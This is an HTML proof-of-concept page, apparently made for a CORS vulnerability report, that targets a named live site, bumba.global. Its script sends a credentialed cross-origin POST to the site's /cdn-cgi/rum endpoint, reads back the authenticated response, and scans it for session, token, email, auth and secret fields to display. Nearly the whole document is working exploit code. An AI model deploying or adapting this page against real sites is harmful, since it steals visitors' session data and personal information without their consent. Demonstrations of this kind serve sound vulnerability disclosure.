<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        pre { background-color: #f0f0f0; padding: 10px; border-radius: 5px; }
        #results { margin-top: 20px; }
    </style>
</head>
<body>
    <h2>CORS Vulnerability Demonstration</h2>
    <button onclick="testVulnerability()">Test Vulnerability</button>
    <div id="results">Click the button to test the CORS vulnerability...</div>
    
    <script>
        function testVulnerability() {
            document.getElementById('results').innerHTML = "Testing... please wait";
            
            fetch("https://bumba.global/cdn-cgi/rum", {
                method: "POST",
                credentials: "include",  // This sends cookies/auth data
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    "entryType": "measure",
                    "startTime": Date.now()
                })
            })
            .then(response => {
                console.log("Response status:", response.status);
                return response.text();
            })
            .then(text => {
                // Display the data we got
                document.getElementById('results').innerHTML = 
                    "<h3>Data retrieved from bumba.global:</h3>" +
                    "<pre>" + text + "</pre>";
                
                // Try to parse it as JSON for better display
                try {
                    const data = JSON.parse(text);
                    document.getElementById('results').innerHTML += 
                        "<h3>Formatted data:</h3>" +
                        "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
                    
                    // Highlight sensitive information
                    highlightSensitiveData(data);
                } catch (e) {
                    // If it's not JSON, just show the raw response
                    console.log("Not JSON or parsing error:", e);
                }
            })
            .catch(error => {
                document.getElementById('results').innerHTML = 
                    "<h3>Error:</h3><pre>" + error.toString() + "</pre>";
            });
        }
        
        function highlightSensitiveData(data) {
            // Look for potentially sensitive fields
            const sensitiveFields = [];
            
            // Check for common sensitive field names
            const checkField = (obj, path = "") => {
                for (const key in obj) {
                    const newPath = path ? `${path}.${key}` : key;
                    
                    // Check if this field name suggests sensitive data
                    if (/id|token|session|user|email|auth|key|secret|hash/i.test(key)) {
                        sensitiveFields.push({path: newPath, value: obj[key]});
                    }
                    
                    // Recurse into objects
                    if (obj[key] && typeof obj[key] === 'object') {
                        checkField(obj[key], newPath);
                    }
                }
            };
            
            checkField(data);
            
            // Display any sensitive fields found
            if (sensitiveFields.length > 0) {
                let html = "<h3>Potentially sensitive information found:</h3><ul>";
                for (const field of sensitiveFields) {
                    html += `<li><strong>${field.path}:</strong> ${field.value}</li>`;
                }
                html += "</ul>";
                document.getElementById('results').innerHTML += html;
            }
        }
    </script>
</body>
</html>
